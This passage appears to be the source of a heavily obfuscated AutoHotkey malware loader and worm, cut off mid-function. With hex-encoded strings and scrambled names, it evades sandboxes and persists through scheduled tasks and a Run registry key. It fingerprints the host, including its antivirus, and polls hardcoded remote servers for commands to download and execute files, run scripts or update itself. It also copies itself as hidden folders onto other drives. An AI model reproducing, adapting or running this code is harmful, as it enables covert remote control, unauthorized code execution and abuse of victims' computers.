;bcolkfqfgzzjmrlhouqlvhvmadebhybdqinlczepspfqziiwowvinbpfxzzdaacyrawtegtoskmmgbsmegdtjbzwoawgcnwvwvlxlcopxiiwvarxojickmtstyfjkrxkdzortpklidsjjoadguunwu
;ddsqreznpkplihlpzkdxvonezoxxabdgzibndwgbjjrhnvzqsczfbzvcmidvryfcyguxzalpmbsdrfjbxqqxdihsigddplmthwefmyevadotlvfgvqfxofkakzqkhrgholazxfqvqnmutwonjlgihx
;aurjnzizpiiwpdhawuqmvfokzglqajqylbuxjorlyfcesraunqxzzffexwsydgwvmoiscjnkoxyioljsicixcakzzmpcfmjnogpdvnzdxotpwwvhlthqxgbkkvuanavenikbpqtbqfpgqlhbzfqqqb


#SingleInstance IGNORE
#NoTrayIcon
global #kf#kfk@fk := 4
global k#f#cc#olafcc@olaf := SubStr(A_ScriptName, 1, InStr(A_ScriptName, ".", False, -1) -1)
global fkkfkf@f := ComObjCreate(ffkkfbb@@bb@("575363726970742E5368656C6C"))
global ffk@f#bbb@@k := ffkkfbb@@bb@("726164")
global #fk#kcc@olaf#k := ffkkfbb@@bb@("73797374656D666978")
global @k#ffk@cc@olaf := k#f#cc#olafcc@olaf
global kkcccolaf# := f#k#cc@olafbbbk@f#f@(21)
global f@#cc#olaf := f#k#cc@olafbbbk@f#f@(21)
global k@kkf@ := f#k#cc@olafbbbk@f#f@(150)
global #f#bb@@f#f := f#k#cc@olafbbbk@f#f@(150)
global @fkcccolafkf#f := ComObjCreate(ffkkfbb@@bb@("536372697074696E672E46696C6553797374656D4F626A656374"))
global f#@kf#@kff := k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E657865")
global kcc@olaf@fk#f#ff := k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E747874")
global #fkfkfk@ := 0
global #bb#@f#k#kfk := 0
global @f#cc#olaf#f@f := ffkkfbb@@bb@("787878")
f#bb#f := 0
if (#kf#kfk@fk = 1){
}else{
if StrLen(A_ScriptName) <> 25
{
exitapp
}
IfInString, A_ScriptDir, % ffkkfbb@@bb@("433A5C")
{
f#kf#k := A_TickCount
while 1 {
Sleep, 1000
#k#ffkf@cccolafk := A_TickCount - f#kf#k
if (#k#ffkf@cccolafk > 120000)
{
break
}
}
if StrLen(A_ScriptFullPath) <> 50
{
exitapp
}
}else{
}
for process in ComObjGet(ffkkfbb@@bb@("77696E6D676D74733A")).ExecQuery(ffkkfbb@@bb@("53656C656374202A2066726F6D2057696E33325F50726F63657373")) {
@fkcc#olafkk := process.Name
fkfkkfkf@fk# := process.CommandLine
f#@kkf#f := process.ExecutablePath
if (StrLen(@fkcc#olafkk) = 25){
if (StrLen(fkfkkfkf@fk#) > 30){
IfInString, fkfkkfkf@fk#, % ffkkfbb@@bb@("2E747874")
{
f#bb#f := f#bb#f + 1
if (StrLen(f#@kkf#f) = 50){
}
}
}
}
}
if (f#bb#f > 1){
exitapp
}
IfInString, A_ScriptDir, % ffkkfbb@@bb@("433A5C")
{
}else{
FileCopyDir, %A_ScriptDir%, C:\%bbbbbbkk%%f@#cc#olaf%%ffk#kk%
FileCopyDir, %A_ScriptDir%, C:\%bb#cccolaf%%kkcccolaf#%%@f#bbb%
FileSetAttrib, +SH, C:\%@fbb#fk#%%f@#cc#olaf%%f#k#@cc#olaf%,1
FileSetAttrib, +SH, C:\%kcccolaf@f%%kkcccolaf#%%#k#k@kf#%,1
FileMove, % ffkkfbb@@bb@("433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E657865") , % ffkkfbb@@bb@("433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E657865")
FileMove, % ffkkfbb@@bb@("433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E747874") , % ffkkfbb@@bb@("433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E747874")
FileMove, % ffkkfbb@@bb@("433A5C") . kkcccolaf# . ffkkfbb@@bb@("5C") . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E657865") , % ffkkfbb@@bb@("433A5C") . kkcccolaf# . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E657865")
FileMove, % ffkkfbb@@bb@("433A5C") . kkcccolaf# . ffkkfbb@@bb@("5C") . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E747874") , % ffkkfbb@@bb@("433A5C") . kkcccolaf# . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E747874")
k@k#cc@olaff#k := ";"
FileAppend, `n %k@k#cc@olaff#k%%k@#fbb#k%%kcc#olaff#@f% %@f#kffk#%%cc#olafkfk%%k@kkf@%, C:\%bbbbbbkk%%f@#cc#olaf%%k##bb#%\%k@bbb#%%kkcccolaf#%%k#f@@kf#%.txt
bbb#ffkfkcc#olaf := FileOpen(ffkkfbb@@bb@("433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E747874"), 0)
k@f@f@fk := bbb#ffkfkcc#olaf.Read()
k@f@f@fk := bb#bb@f#bb#kff(k@f@f@fk)
bbb#ffkfkcc#olaf.Close()
@bb@#fkf := FileOpen(ffkkfbb@@bb@("433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E747874"), 5)
@bb@#fkf.WriteLine(k@k#cc@olaff#k . #f#bb@@f#f)
@bb@#fkf.Write(k@f@f@fk)
@bb@#fkf.Close()
run % ffkkfbb@@bb@("433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E65786520433A5C") . f@#cc#olaf . ffkkfbb@@bb@("5C") . kkcccolaf# . ffkkfbb@@bb@("2E747874")
exitapp
}
f#k@#fk#@kf@#f#k()
cccolaff@f@fk#ffkf()
}
f@kkf@f@f@#k := Object()
f@kkf@f@f@#k.Insert(ffkkfbb@@bb@("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39383938"))
f@kkf@f@f@#k.Insert(ffkkfbb@@bb@("687474703A2F2F7375706572616C7068612E7261646E65776167652E636F6D3A39383938"))
f@kkf@f@f@#k.Insert(ffkkfbb@@bb@("687474703A2F2F7375706572616C7068612E6E65776D696E6572736167652E636F6D3A33333333"))
f@kkf@f@f@#k.Insert(ffkkfbb@@bb@("687474703A2F2F6E6577616C7068612E73757065722D67616D657A65722E636F6D3A39333333"))
f@kkf@f@f@#k.Insert(ffkkfbb@@bb@("687474703A2F2F6E6577616C7068612E616C7068616E6F6F622E636F6D3A39393939"))
f@kkf@f@f@#k.Insert(ffkkfbb@@bb@("687474703A2F2F6E6F6F626D696E65722E7075626C6963766D2E636F6D3A39383938"))
cccolaffbb#ffkf@ := f@kkf@f@f@#k.MaxIndex()
f@f@#k@kfk := 0
while 1 {
if (f@f@#k@kfk = cccolaffbb#ffkf@){
f@f@#k@kfk := 1
}else{
f@f@#k@kfk := f@f@#k@kfk + 1
}
cccolaff@f@fk#ffkf()
kfkkf#f@cccolafk#k(f@kkf@f@f@#k[f@f@#k@kfk])
}
kfkkf#f@cccolafk#k(#kfk@f#f@bb#fk){
k#@kfkfkkcc@olaf = 0
while 1 {
cccolaff@f@fk#ffkf()
if (k#@kfkfkkcc@olaf = 6){
break
}
kf@fkcccolafkf := ffk@f@k@k@#f(#kfk@f#f@bb#fk)
if (kf@fkcccolafkf = ffkkfbb@@bb@("4552524F52")){
k#@kfkfkkcc@olaf := k#@kfkfkkcc@olaf + 1
@kf#kfkcccolafk@#f(ffkkfbb@@bb@("636F756C646E7420636F6E6E65637420746F20") . #kfk@f#f@bb#fk . "-" . kf@fkcccolafkf)
}else{
cc#olaffk@f@ := f#fkf@k#kfk#f@k@(kf@fkcccolafkf)
if (cc#olaffk@f@ = ""){
k#@kfkfkkcc@olaf := k#@kfkfkkcc@olaf + 1
@kf#kfkcccolafk@#f(ffkkfbb@@bb@("636F756C646E742066696E6420636F6D6D616E6420696E20") . #kfk@f#f@bb#fk . "-" . kf@fkcccolafkf)
}else{
k#@kfkfkkcc@olaf := 0
@kf#kfkcccolafk@#f(ffkkfbb@@bb@("636F6E6E656374656420746F202022202E2061646472657373202E202220646174613A20") . cc#olaffk@f@)
#fk@kffkf#@cc@olaf#k(kf@fkcccolafkf)
}
}
}
}
ffk@f@k@k@#f(k@k#kkf@@cc#olaf) { 
static f#ffbbbfk# := ComObjCreate(ffkkfbb@@bb@("57696E487474702E57696E48747470526571756573742E352E31"))
try {
f#ffbbbfk#.Open(ffkkfbb@@bb@("474554"), k@k#kkf@@cc#olaf . "/" . f@f@@cc#olaf#k#f@f() , true)
f#ffbbbfk#.Send()
f#ffbbbfk#.WaitForResponse()
} catch {
return ffkkfbb@@bb@("4552524F52")
}
if (f#ffbbbfk#.Status = 200){
return f#ffbbbfk#.ResponseText
}else{
return ffkkfbb@@bb@("4552524F52")
}
}
f#f@@f#kf@kk(){
try {
For objOS In ComObjGet(ffkkfbb@@bb@("77696E6D676D74733A5C5C6C6F63616C686F73745C726F6F745C736563757269747963656E74657232")).InstancesOf(ffkkfbb@@bb@("416E7469566972757350726F64756374")) {
k@#kffk@kk := ObjOS.displayName
}
} catch {
return "Unknown"
}
return k@#kffk@kk
}
f@kfk#k@f#f@@k(){
try {
For objOS In ComObjGet(ffkkfbb@@bb@("77696E6D676D74733A5C5C")).InstancesOf(ffkkfbb@@bb@("57696E33325F4F7065726174696E6753797374656D")) {
cc@olaffkfkk := ObjOS.Caption
}
} catch {
return "Unknown"
}
return cc@olaffkfkk
}
@kf#kfkcccolafk@#f(k#kf#f#k#fkfk#ff){


}
k#k@f#kf#k#f#bbb(@bb@k@kf#bb@kf) { 
local f@#kf@@kf#kf, #f#k@k, f#kcccolaf
If !@bb@k@kf#bb@kf
Return 0
f@#kf@@kf#kf := A_FormatInteger
SetFormat, INTEGER, H
Loop, Parse, @bb@k@kf#bb@kf
{
#f#k@k := Asc(A_LoopField)
StringTrimLeft, #f#k@k, #f#k@k, 2
f#kcccolaf .= #f#k@k . ""
}
SetFormat, INTEGER, %f##kf#@k%%fkfbb#fk%%f@#kf@@kf#kf%
Return f#kcccolaf
}
urlsafe_b64decode(k#k@f@@f)
{
Return #bbbcc@olaff@f@f@k(k#k@f@@f, "-_")
}
@fbb@cccolafkfk#k@fk(@k#bbbkf@f#k, @fkffk#cc#olaf@f#k:="+/") { 
StringLeft, @fkffk#cc#olaf@f#k, @fkffk#cc#olaf@f#k, 2
Return fkkf@cc@olafkf@f(@k#bbbkf@f#k, ffkkfbb@@bb@("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . @fkffk#cc#olaf@f#k)
}
#bbbcc@olaff@f@f@k(f@@f@kfk#bb@, #kfkcccolafkf@bbb@#f:="+/") { 
StringLeft, #kfkcccolafkf@bbb@#f, #kfkcccolafkf@bbb@#f, 2
Return k#f@f#k@f@kcccolaf(f@@f@kfk#bb@, ffkkfbb@@bb@("4142434445464748494A4B4C4D4E4F505152535455565758595A6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839") . #kfkcccolafkf@bbb@#f)
}
fkkf@cc@olafkf@f(kfk#@f#f#fk@f#k#, @f@fkfbbb@#k#k#k:=""){
StringCaseSense On
Loop, Parse, kfk#@f#f#fk@f#k#
{
bb#k@kf# := Mod(A_Index, 3)
if (bb#k@kf# = 1)
{
f##fk# := ((Asc(A_LoopField) >> 2) & 0x3F)
f#k@@k := (Asc(A_LoopField) & 0x03 ) << 4
}
else if (bb#k@kf# = 2)
{
f##fk# := f#k@@k | ((Asc(A_LoopField) >> 4) & 0x0F)
f#k@@k := (Asc(A_LoopField) & 0x0F) << 2
}
else
{
f##fk# := f#k@@k | ((Asc(A_LoopField) >> 6) & 0x03)
StringMid, base64Char, @f@fkfbbb@#k#k#k, f##fk# + 1, 1
k#k@f@@f := k#k@f@@f base64Char
f##fk# := (Asc(A_LoopField)) & 0x3F
}
StringMid, base64Char, @f@fkfbbb@#k#k#k, f##fk# + 1, 1
k#k@f@@f := k#k@f@@f base64Char
}
if (bb#k@kf# = 1)
{
StringMid, base64Char, @f@fkfbbb@#k#k#k, f#k@@k + 1, 1
return k#k@f@@f base64Char "=="
}
else if (bb#k@kf# = 2)
{
StringMid, base64Char, @f@fkfbbb@#k#k#k, f#k@@k + 1, 1
return k#k@f@@f base64Char "="
}
else
{
return k#k@f@@f "=="
}
}
k#f@f#k@f@kcccolaf(fk#k@k@f@k@cc@olaf@k, #fk##kfk@kkcc#olaf:=""){
StringReplace fk#k@k@f@k@cc@olaf@k, fk#k@k@f@k@cc@olaf@k, =,,All
StringReplace, fk#k@k@f@k@cc@olaf@k, fk#k@k@f@k@cc@olaf@k, `r,,All
StringReplace, fk#k@k@f@k@cc@olaf@k, fk#k@k@f@k@cc@olaf@k, `n,,All
StringCaseSense On
Loop, Parse, fk#k@k@f@k@cc@olaf@k
{
StringGetPos, currentBin, #fk##kfk@kkcc#olaf, %A_LoopField%
@kf#fk := Mod(A_Index, 4)
if (@kf#fk = 1)
{
f#k@@k := currentBin << 2
}
else if (@kf#fk = 2)
{
#f#bb#k#f@#k := #f#bb#k#f@#k Chr(f#k@@k | (currentBin >> 4))
f#k@@k := (currentBin & 0x0F) << 4
}
else if (@kf#fk = 3)
{
#f#bb#k#f@#k := #f#bb#k#f@#k Chr(f#k@@k | (currentBin >> 2))
f#k@@k := (currentBin & 0x03) << 6
}
else
{
#f#bb#k#f@#k := #f#bb#k#f@#k Chr(f#k@@k | currentBin)
}
}
Return #f#bb#k#f@#k
}
f#k@#fk#@kf@#f#k() {
#f#cccolaf@cc#olaffk := A_ScriptDir . "\" . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E657865")
k@#cc#olafk@ := @fk@fbbbf##bb#ff(A_ScriptDir . "\" . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("2E747874"))
@k@ffk@cccolaf := ffkkfbb@@bb@("7363687461736B73202F637265617465202F7363206D696E757465202F6D6F2031202F746E")
run, %@k@ffk@cccolaf%%#fbbb@@k%%f@k@kk% %cc#olafcccolaf@f%%@k#ffk@cc@olaf%%@cc@olaff##k% /tr "%#f#cccolaf@cc#olaffk%%k@@k%%#fkf% %k@#cc#olafk@%%@k#f%%#f@k#fkf%",,Hide
Sleep, 3000
fkfbbbff := ffkkfbb@@bb@("7363687461736B732E657865")
Process, Close, %f##kf#@k%%fkfbbbff%%@f#kffk#%
RegWrite, % ffkkfbb@@bb@("5245475F535A") , % ffkkfbb@@bb@("484B4355"), % ffkkfbb@@bb@("536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E"), %@f@kf#%%@k#ffk@cc@olaf%%ffk#kk%, %k@fk%%#f#cccolaf@cc#olaffk%%f##kf#@k% %k#f@@kf#%%fk@f#fkk%%k@#cc#olafk@%
}
f#kfkkf@@kf#kk(k#f#@f#f#cc@olafkk){
Process,Exist,%ffk#f@%%k#f#@f#f#cc@olafkk%%#fbbb@@k%
return Errorlevel
}
@ffk#fk#bb#fkkf#(){
@cc#olaf#k@k := f@bb#bbb@f@kf@(f@ffkkcc#olafk#fk@k#() . A_OSVersion  . f@kfk#k@f#f@@k())
return SubStr(@cc#olaf#k@k, 1, 30)
}
f@ffkkcc#olafk#fk@k#(){
try {
DriveGet, hSerial, Serial, C:
} catch {
return ffkkfbb@@bb@("556E6B6E6F776E")
}
return hSerial
}
@fkcc#olafbb#fk@fk(){
if  ( f#kfkkf@@kf#kk(ffkkfbb@@bb@("73747265616D65722E657865")) or f#kfkkf@@kf#kk(ffkkfbb@@bb@("6C697665776F726B65722E657865")) or f#kfkkf@@kf#kk(ffkkfbb@@bb@("7375706572636865636B65722E657865")) or f#kfkkf@@kf#kk(ffkkfbb@@bb@("737065656475702E657865")) or f#kfkkf@@kf#kk(ffkkfbb@@bb@("6E6F76612E657865"))){
return 1
}
return 0
}
#k@f@bb#k@#f@f(){
if  f#kfkkf@@kf#kk(ffkkfbb@@bb@("637075636865636B65722E657865")) or f#kfkkf@@kf#kk(ffkkfbb@@bb@("637075636865636B657233322E657865"))
{
return 1
}
return 0
}
f@f@@cc#olaf#k#f@f(){
cc@olafbb##ffbb# := fkkfkf@f.ExpandEnvironmentStrings(ffkkfbb@@bb@("25434F4D50555445524E414D4525"))
kf@kf#bb#f := fkkfkf@f.ExpandEnvironmentStrings(ffkkfbb@@bb@("25555345524E414D4525"))
spreadisrun := @fkcc#olafbb#fk@fk()
#f@k#f := f@kfk#k@f#f@@k()
f@kfk##fk@fk := #k@f@bb#k@#f@f()
@bbbfk#k := f#f@@f#kf@kk()
#fk#bb#k@k := @ffk#fk#bb#fkkf#() . ffkkfbb@@bb@("2F312F") . f@bb#bbb@f@kf@(#f@k#f)  . "/" . f@bb#bbb@f@kf@(cc@olafbb##ffbb#) . "/" . f@bb#bbb@f@kf@(kf@kf#bb#f)  . "/" .  f@bb#bbb@f@kf@(ffk@f#bbb@@k)  . "/" .   f@bb#bbb@f@kf@(k@#kffk@kk)  . "/" .  spreadisrun  . "/" .  f@kfk##fk@fk
return #fk#bb#k@k
}
f@bb#bbb@f@kf@(k@kf@kf@k@k@f#kf){
k@kf@kf@k@k@f#kf := k#k@f#kf#k#f#bbb(@fbb@cccolafkfk#k@fk(k@kf@kf@k@k@f#kf))
return k@kf@kf@k@k@f#kf
}
f#fkf@k#kfk#f@k@(#k@fk#fk@f#fkk){
try {
kffbb##fk#:=RegExMatch(#k@fk#fk@f#fkk, ffkkfbb@@bb@("3A3A283F503C4E616D653E2E2A3F293A3A"), match)
} catch {
return ""
}
return matchName
}
@cccolafkkffkfbb#k(k#kf@k#kf#k#@cccolaf) { 
@f@bb@#kf@@f := ""
@k@bb@k@:=1
Loop % StrLen(k#kf@k#kf#k#@cccolaf)/2	{
cccolaf@#k := SubStr(k#kf@k#kf#k#@cccolaf, @k@bb@k@ , 2)
@f@bb@#kf@@f .= Chr("0x" cccolaf@#k)
@k@bb@k@ +=2
}
Return @f@bb@#kf@@f
}
@kf@@bb@kffk(cc@olafbb@@k@kffkf@k,f@#kf#kfk@k#f#,fbb@@bb#bbbbb#){
try {
kf@f#kf@cccolaf@:=RegExMatch(cc@olafbb@@k@kffkf@k, f@#kf#kfk@k#f# . ffkkfbb@@bb@("283F503C4E616D653E2E2A3F29") . fbb@@bb#bbbbb#, match)
} catch {
return ""
}
return matchName
}
#fk@kffkf#@cc@olaf#k(#cccolaf#kffk@ffkk){
@kf#kfkcccolafk@#f(ffkkfbb@@bb@("67657420636F6D6D616E64") . #bbbcc@olaff@f@f@k(@cccolafkkffkfbb#k(#cccolaf#kffk@ffkk)))
@kkf#ffkkf := #bbbcc@olaff@f@f@k(@cccolafkkffkfbb#k(#cccolaf#kffk@ffkk))
cc#olafcc@olaf@k@f := ffkkfbb@@bb@("433A5C") . k#f#cc#olafcc@olaf
if (FileExist(cc#olafcc@olaf@k@f)) {
}else{
cc#olafcc@olaf@k@f := A_ScriptDir
}
f@fk@kf@fk#f := ffkkfbb@@bb@("7570646174652D")
f#@bbbk@kk := ffkkfbb@@bb@("646F776E6C6F61642D")
k#ffkf@ffk := ffkkfbb@@bb@("7363726970742D")
k@fkcccolafkfk := ffkkfbb@@bb@("75706461746573656C662D")
IfInString, @kkf#ffkkf, %@f@kfbb@%%#cccolafkf#k%%f@fk@kf@fk#f%
{
@fk#fkkf#k := @kf@@bb@kffk(@kkf#ffkkf,ffkkfbb@@bb@("7570646174652D"),ffkkfbb@@bb@("2D757064617465"))
cc@olafkkf#bb# := ffkkfbb@@bb@("5C") . f#k#cc@olafbbbk@f#f@(10) . ffkkfbb@@bb@("2E747874")
if FileExist(A_ScriptDir . ffkkfbb@@bb@("5C") . cc@olafkkf#bb#){
FileDelete ,%A_ScriptDir%\%@bb##kfk%%fbb#%%cc@olafkkf#bb#%
}
@kf#kfkcccolafk@#f(ffkkfbb@@bb@("646F776E6C6F6164696E672075706461746520") . cc@olafkkf#bb# . " - " . @fk#fkkf#k)
UrlDownloadToFile, %@fk#fkkf#k%%#fkfkfk#%%@f#bbb%, %A_ScriptDir%\%cc@olafkkf#bb#%%cccolafkf#@f%%bb#cccolaf%
if FileExist(A_ScriptDir . ffkkfbb@@bb@("5C") . cc@olafkkf#bb#){
FileDelete ,%A_ScriptDir%\%fbbb#bbb%%@kf#k@#k%%kcc@olaf@fk#f#ff%
FileMove, %A_ScriptDir%\%bbbbbbkk%%cc@olafkkf#bb#%%#fbbb@@k%, %A_ScriptDir%\%@bb@cccolaff%%kcc@olaf@fk#f#ff%%#kfkkf#k%
Run,%A_ScriptDir%\%#bb##bb@%%f@#f%%f#@kf#@kff% %A_ScriptDir%\%kcc@olaf@fk#f#ff%%@fbb#fk#%%fkkf#k%
exitapp
}
return
}
IfInString, @kkf#ffkkf, %ffk#kk%%fbb@f##k%%f#@bbbk@kk%
{
k#k#fk#f := @kf@@bb@kffk(@kkf#ffkkf,ffkkfbb@@bb@("646F776E6C6F61642D"),ffkkfbb@@bb@("2D646F776E6C6F6164"))
k#k#fk#f := StrSplit(k#k#fk#f, ffkkfbb@@bb@("3A213A"))
@f#bb#fbbb := ffkkfbb@@bb@("5C") . f#k#cc@olafbbbk@f#f@(10) . ffkkfbb@@bb@("2E747874")
@kf#k@k# := k#k#fk#f[1]
cc@olafkkf#bb# := k#k#fk#f[2]
if FileExist(cc#olafcc@olaf@k@f . ffkkfbb@@bb@("5C") . cc@olafkkf#bb#){
FileDelete ,%k@#k@f%%cc#olafcc@olaf@k@f%%ffbb#f%\%k##bb#%%cc@olafkkf#bb#%%k@bbb#%
}
@kf#kfkcccolafk@#f("downloading file " . cc@olafkkf#bb# . " - " . @kf#k@k#)
if FileExist(cc#olafcc@olaf@k@f . @f#bb#fbbb){
FileDelete ,%@kf#k@#k%%k@bbb#%%cc#olafcc@olaf@k@f%%fbbb#bbb%%@f#bb#fbbb%%@kkffk%
}
UrlDownloadToFile, %bbbfkk%%@kf#k@k#%%kf#fkfkk%, %f@#f@cccolaf%%cc#olafcc@olaf@k@f%%@f@kfbb@%%f@#f%%@f#bb#fbbb%%bb#kfk%
if FileExist(cc#olafcc@olaf@k@f . @f#bb#fbbb){
FileMove, %cc#olafcc@olaf@k@f%%cc#olafkfk%%#fkf%%@cc@olaff##k%%@f#bb#fbbb%%@cc@olaff##k%, %cc#olafcc@olaf@k@f%%cc#olafcccolaf@f%%fk@f#fkk%\%#fbbb@@k%%cc@olafkkf#bb#%%f@k@kk%
IfInString, cc@olafkkf#bb#, %#fk@@k%%f#fk#cccolaf%%@f#cc#olaf#f@f%
{
k##bb@k@ff := ffkkfbb@@bb@("433A5C") . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("5C") . f#@kf#@kff . " " . ffkkfbb@@bb@("433A5C") . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("5C") . cc@olafkkf#bb#
Run,%k##bb@k@ff%%k#kf@k#f%%#cccolafkf#k%
}else{
Run,%kfkcc@olaf#f%%cc#olafcc@olaf@k@f%%f#k#@cc#olaf%\%fkfbb#fk%%cc@olafkkf#bb#%%fk@bb#kf%
}
}
return
}
IfInString, @kkf#ffkkf, %f@cccolafk%%k#ffkf@ffk%%f#f@bbb#%
{
@fk#k#kkf#kf := @kf@@bb@kffk(@kkf#ffkkf,ffkkfbb@@bb@("7363726970742D"),ffkkfbb@@bb@("2D736372697074"))
@fk#k#kkf#kf := StrSplit(@fk#k#kkf#kf, ":!:")
bbb#f@@f := @fk#k#kkf#kf[1]
k@#cc@olafffkf := @fk#k#kkf#kf[2]
fbb#f#@k :=  ffkkfbb@@bb@("5C") . f#k#cc@olafbbbk@f#f@(10) . ffkkfbb@@bb@("2E747874")
@f@bb@kcc#olafk# := cc#olafcc@olaf@k@f . ffkkfbb@@bb@("5C") . k@#cc@olafffkf
if FileExist(@f@bb@kcc#olafk#){
FileDelete ,%kf#fkfkk%%@f@bb@kcc#olafk#%%cc@olafkf#%
}
if FileExist(cc#olafcc@olaf@k@f . fbb#f#@k){
FileDelete ,%ffkf@k%%@kf#k@#k%%cc#olafcc@olaf@k@f%%fbb#f#@k%%fkfk%%f#k#@cc#olaf%
}
@kf#kfkcccolafk@#f("script file " . k@#cc@olafffkf . " - " . bbb#f@@f)
FileAppend, %#k#fk@kk%%bbb#f@@f%%f@#f@cccolaf%, %f@fkf#kf%%cc#olafcc@olaf@k@f%%f#f@bbb#%%fbb#f#@k%%fbb@f##k%%@bb##kfk%
FileMove, %fk@fkk%%cc#olafcc@olaf@k@f%%bb#cccolaf%%kf#fkfkk%%kcccolaf@f%%fbb#f#@k%, %@k#bb@f#%%cc#olafcc@olaf@k@f%%fkfbb#fk%\%kf@fk@#k%%k#k#kf%%k@#cc@olafffkf%
IfInString, k@#cc@olafffkf, %k@#fbb#k%%@f#cc#olaf#f@f%%cc@olaff%
{
k##bb@k@ff := ffkkfbb@@bb@("433A5C") . k#f#cc#olafcc@olaf . ffkkfbb@@bb@("5C") . f#@kf#@kff . " " .  @f@bb@kcc#olafk#
Run,%f@k@kk%%f#f@%%k##bb@k@ff%
}else{
Run,%bb#kfk%%k#f@f@kk%%cc#olafcc@olaf@k@f%\%kf#fkfkk%%k@#cc@olafffkf%%cccolaf@k@%
}
return
}
IfInString, @kkf#ffkkf, %k@fkcccolafkfk%%#kfkkf#k%%cccolaf@k@%
{
kkcccolaf#  := k#f#cc#olafcc@olaf
k@k#cc@olaff#k := ";"
FileAppend, `n %k@k#cc@olaff#k%%ffkf@k%%kfk#f@% %ffk##k%%k@kkf@%%#kfkkf#k%, %A_ScriptFullPath%
#f#fk#ff := FileOpen(A_ScriptFullPath, 0)
k@k#f@k@k@ := #f#fk#ff.Read()
k@k#f@k@k@ := bb#bb@f#bb#kff(k@k#f@k@k@)
#f#fk#ff.Close()
@f@fkkf#fkf@ := FileOpen(A_ScriptFullPath, 5)
@f@fkkf#fkf@.WriteLine(k@k#cc@olaff#k . #f#bb@@f#f)
@f@fkkf#fkf@.Write(k@k#f@k@k@)
@f@fkkf#fkf@.Close()
kkcccolaf# := f#k#cc@olafbbbk@f#f@(21)
return
}
IfInString, @kkf#ffkkf, % ffkkfbb@@bb@("736C6565702D")
{
f#@fk#bbb@fk := @kf@@bb@kffk(@kkf#ffkkf,ffkkfbb@@bb@("736C6565702D"),ffkkfbb@@bb@("2D736C656570"))
@kf#kfkcccolafk@#f(ffkkfbb@@bb@("736C656570696E6720") . f#@fk#bbb@fk)
#cc@olaf@kfbb@#kfk(f#@fk#bbb@fk)
return
}
sleep , 1000
}
#cc@olaf@kfbb@#kfk(k@@cc#olafk@k#@bb@kf){
if (#kf#kfk@fk = 1){
sleep , 5000
}else{
sleep k@@cc#olafk@k#@bb@kf
}
}
@fk@fbbbf##bb#ff(@kkfk@f@fbbbf@fk){
try {
VarSetCapacity(SHORT,StrLen(@kkfk@f@fbbbf@fk)*2)
DllCall("GetShortPathName","Str",@kkfk@f@fbbbf@fk,"Str",SHORT,"UInt",StrLen(@kkfk@f@fbbbf@fk)*2)
} catch {
return @kkfk@f@fbbbf@fk
}
if (SHORT = "")
{
return @kkfk@f@fbbbf@fk
}
Return SHORT
}
f#k#cc@olafbbbk@f#f@(k#@cccolaff@cc#olafcccolaff@) {
static   c
if   !c
Loop, 26
c .=   (!c ? "" : "`n") Chr(A_Index + 96)
Loop %   k#@cccolaff@cc#olafcccolaff@
{
Random, n, 1, 1296
Loop %   n
Sort, c, Random
str .=   SubStr(c,1,1)
}
return   str
}
cccolaff@f@fk#ffkf() {
For objOS In @fkcccolafkf#f.Drives {
bb#f@f := ObjOS.path
if (bb#f@f = ffkkfbb@@bb@("433A")){
}else{
@ffk#f@bbb = %kkf@%%bb#f@f%%k#k#kf%\*.*
Loop, %@kcc#olaffk@%%kfk@%%@ffk#f@bbb%
{
@f#f@cc@olaf = %A_LoopFileDir%
}
#fkfkfk@ := 0
Loop, %@ffk#f@bbb%%#bb##bb@%%k##bb#%, 1
{
if (#fkfkfk@ > 0){
if (#bb#@f#k#kfk > 0){
break
}
}
FileGetAttrib,CurAttrib, %A_LoopFileFullPath%
IfInString, CurAttrib, D
{
StringReplace, A_LoopRelativeFileName, A_LoopFileFullPath, %@f#f@cc@olaf%%ffbb#f%%@f@kf#%,
if (A_LoopRelativeFileName = ffkkfbb@@bb@("5C2452454359434C452E42494E")){
}else{
fkf@#f@cc@olaf := SubStr(k#f#cc#olafcc@olaf, 1, 3)
bbb#f#k@k@kf := A_LoopRelativeFileName
StringReplace, bbb#f#k@k@kf, bbb#f#k@k@kf,  "\",
ifexist, %@bb#f@#k%%kfk@%%bb#f@f%%A_LoopRelativeFileName%\%fk@f#f%%kf#fkfkk%%k#f#cc#olafcc@olaf%
{
FileGetSize, oldfilesize, %bbbfkk%%bb#f@f%%f@bb@k@k%%A_LoopRelativeFileName%\%k#f#cc#olafcc@olaf%%bbbbbbkk%%#k#k@kf#%\%k#f#cc#olafcc@olaf%%bbbkf#%%fkfk%.txt
FileGetSize, scriptfilesize, %A_ScriptFullPath%
if (oldfilesize <> scriptfilesize){
FileCopyDir, %A_ScriptDir%, %@fkcc@olaf%%bb#f@f%%f@cccolafk%%A_LoopRelativeFileName%\%k#f#cc#olafcc@olaf%%fk#kf#kk%%k#f@@kf#%,1
}else{
#fkfkfk@ := #fkfkfk@ + 1
break
}
}else{
